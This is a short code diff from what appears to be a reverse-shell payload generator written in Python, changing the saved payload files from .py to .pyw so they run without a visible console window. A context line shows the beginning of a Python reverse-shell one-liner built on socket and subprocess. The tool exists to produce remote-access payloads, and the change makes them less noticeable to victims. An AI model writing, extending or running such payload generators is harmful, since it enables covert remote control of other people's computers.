@@ -52,9 +52,9 @@ except KeyboardInterrupt:
     for i in range(length):
         letters = random.choice(payloadName)
         name += letters
-    with open(f"{name}.py", "w") as payload:
+    with open(f"{name}.pyw", "w") as payload:
         payload.write(windows_payload)
-    print(f"Payload generated: {name}.py")
+    print(f"Payload generated: {name}.pyw")
 
 
 def linux():
@@ -73,9 +73,9 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
     for i in range(length):
         letters = random.choice(payloadName)
         name += letters
-    with open(f"{name}.py", "w") as payload:
+    with open(f"{name}.pyw", "w") as payload:
         payload.write(linux_payload)
-    print(f"Payload generated: {name}.py")
+    print(f"Payload generated: {name}.pyw")
     
 def payloadSelection():
     choices = input("""
